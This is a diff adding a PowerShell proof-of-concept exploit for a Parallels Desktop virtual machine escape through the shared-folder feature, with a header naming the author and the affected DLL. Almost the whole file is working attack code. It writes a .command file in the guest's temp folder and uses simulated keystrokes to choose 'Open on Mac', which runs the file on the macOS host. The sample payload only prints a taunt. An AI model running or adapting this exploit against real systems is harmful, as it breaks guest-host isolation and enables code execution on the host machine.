@@ -1,0 +1,57 @@
+#[+] Title:  Parallels Desktop - Virtual Machine Escape
+#[+] Product: Parallels
+#[+] Vendor: http://www.parallels.com/products/desktop/
+#[+] Affected Versions: All Version
+#
+#
+# Author      :   Mohammad Reza Espargham
+# Linkedin    :   https://ir.linkedin.com/in/rezasp
+# E-Mail      :   me[at]reza[dot]es , reza.espargham[at]gmail[dot]com
+# Website     :   www.reza.es
+# Twitter     :   https://twitter.com/rezesp
+# FaceBook    :   https://www.facebook.com/reza.espargham
+# Github : github.com/rezasp
+# youtube : https://youtu.be/_nZ4y0ZTrwA
+#
+#
+
+#There is a security issue in the shared folder implementation in Parallels Desktop
+#DLL : PrlToolsShellExt.dll  10.2.0 (28956)
+#prl_tg Driver
+
+
+#Very simple exploit with powershell
+#powershell.exe poc.ps1
+
+#Write OSX Executable file in temp
+[io.file]::WriteAllText($env:temp + '\r3z4.command',"Say 'You are hacked by 1337'")
+
+
+add-type -AssemblyName microsoft.VisualBasic
+
+add-type -AssemblyName System.Windows.Forms
+
+#open temp in explorer
+explorer $env:temp
+
+#wait for 500 miliseconds
+start-sleep -Milliseconds 500
+
+#select Temp active window
+[Microsoft.VisualBasic.Interaction]::AppActivate("Temp")
+
+#find r3z4.command file
+[System.Windows.Forms.SendKeys]::SendWait("r3z4")
+
+#right click
+[System.Windows.Forms.SendKeys]::SendWait("+({F10})")
+
+#goto "Open on Mac" in menu
+[System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
+[System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
+[System.Windows.Forms.SendKeys]::SendWait("{DOWN}")
+
+#Click Enter
+[System.Windows.Forms.SendKeys]::SendWait("~")
+
+#Enjoy ;)s
